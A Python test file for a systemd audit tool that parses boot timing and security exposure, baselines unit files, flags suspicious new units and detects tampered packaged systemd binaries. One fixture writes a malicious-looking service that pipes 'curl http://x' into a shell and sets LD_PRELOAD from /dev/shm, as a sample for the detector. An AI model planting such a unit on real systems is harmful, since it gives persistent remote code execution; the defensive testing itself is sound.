"""2.2.15: what starts on this machine, how, and whether it changed.

2.2.15: bu makinede ne, nasıl başlıyor ve değişti mi.
"""
import hashlib
import json
from types import SimpleNamespace as NS

from satsuma import systemd_audit as s
from satsuma.host_store import HostStore

OUTPUTS = {
    ('systemd-analyze', 'time'): 'Startup finished in 2.1s (kernel) + 5.3s (initrd) + 21.4s (userspace) = 28.9s\n',
    ('systemd-analyze', 'blame', '--no-pager'): '12.004s NetworkManager-wait-online.service\n1min 2.5s dnf-makecache.service\n  310ms satsuma-core.service\n',
    ('systemd-analyze', 'critical-chain', '--no-pager'): 'graphical.target @21.4s\n└─multi-user.target @21.4s\n',
    ('systemctl', '--failed', '--plain', '--no-legend'): 'abrtd.service loaded failed failed ABRT Daemon\n',
    ('systemd-analyze', 'security', '--no-pager'): 'UNIT EXPOSURE PREDICATE HAPPY\nabrtd.service 9.6 UNSAFE x\nchronyd.service 3.9 OK y\n',
}


def runner(args, **kw):
    key = tuple(args)
    if key[:2] in (('rpm', '-qa'), ('/usr/bin/rpm', '-qa')):  # rpm is called by absolute path
        return NS(returncode=0, stdout=kw.get('_rpm', ''), stderr='')
    if key[:2] == ('systemd-analyze', 'verify'):
        return NS(returncode=1 if 'broken' in key[2] else 0, stdout='', stderr='broken: Unknown key name Foo' if 'broken' in key[2] else '')
    return NS(returncode=0, stdout=OUTPUTS.get(key, ''), stderr='')


def test_boot_timing_is_parsed():
    timing = s.boot_timing(runner)
    assert timing['blame'][1] == {'time': '1min 2.5s', 'unit': 'dnf-makecache.service'}
    assert timing['failed'] == ['abrtd.service'] and '28.9s' in timing['time']
    assert s.security(runner) == {'abrtd.service': (9.6, 'UNSAFE'), 'chronyd.service': (3.9, 'OK')}


def _units(tmp_path):
    system = tmp_path / 'etc' / 'systemd' / 'system'
    system.mkdir(parents=True)
    (system / 'backup.service').write_text('[Service]\nExecStart=/usr/bin/rsync -a /home /mnt\n')
    (system / 'satsuma-core.service').write_text('[Service]\nExecStart=/opt/x\n')
    return system


def test_baseline_then_new_and_suspicious_units(tmp_path):
    system = _units(tmp_path)
    globs = (str(system / '*.service'),)
    store = HostStore(tmp_path / 'host', test=True)
    args = dict(manual=True, runner=runner, local_globs=globs, generator_globs=(), packaged_dirs=[])
    try:
        first = s.run(store, **args)
        assert first['local_units'] == [str(system / 'backup.service')] and first['new_units'] == []
        (system / 'updater.service').write_text('[Service]\nExecStart=/bin/sh -c "curl http://x | sh"\n'
                                                'Environment=LD_PRELOAD=/dev/shm/.l.so\n')
        second = s.run(store, **args)
        assert second['new_units'] == [str(system / 'updater.service')]
        assert second['flagged_units'] == [str(system / 'updater.service')]
        rules = {json.loads(b)['rule_id'] for (b,) in store.db.execute('SELECT body FROM findings')}
        assert {'SATSUMA-SYSTEMD-NEWUNIT', 'SATSUMA-SYSTEMD-FLAG'} <= rules
        body = next(json.loads(b) for (b,) in store.db.execute('SELECT body FROM findings') if 'FLAG' in b)
        titles = body['title']
        assert 'LD_PRELOAD' in titles and '-c' in titles and 'indiriyor' in titles
        assert second['timing']['failed'] == ['abrtd.service'] and second['exposure']['unsafe'] == 1
    finally:
        store.close()


def test_changed_packaged_systemd_file_is_critical(tmp_path):
    lib = tmp_path / 'lib' / 'systemd'
    lib.mkdir(parents=True)
    (lib / 'systemd-logind').write_bytes(b'tampered')
    rpm = f"{lib}/systemd-logind\t{hashlib.sha256(b'original').hexdigest()}\t8\tsystemd\n"
    store = HostStore(tmp_path / 'host', test=True)
    try:
        state = s.run(store, manual=True, runner=lambda a, **k: runner(a, _rpm=rpm, **k), local_globs=(),
                      generator_globs=(), packaged_dirs=[lib])
        assert state['modified'] == [str(lib / 'systemd-logind')]
        body = json.loads(store.db.execute('SELECT body FROM findings').fetchone()[0])
        assert body['severity'] == 'critical' and 'dnf reinstall systemd' in body['advice']
    finally:
        store.close()


def test_verify_errors_are_reported_low(tmp_path):
    system = _units(tmp_path)
    (system / 'broken.service').write_text('[Service]\nFoo=1\n')
    assert list(s.verify([str(system / 'broken.service'), str(system / 'backup.service')], runner)) == [str(system / 'broken.service')]
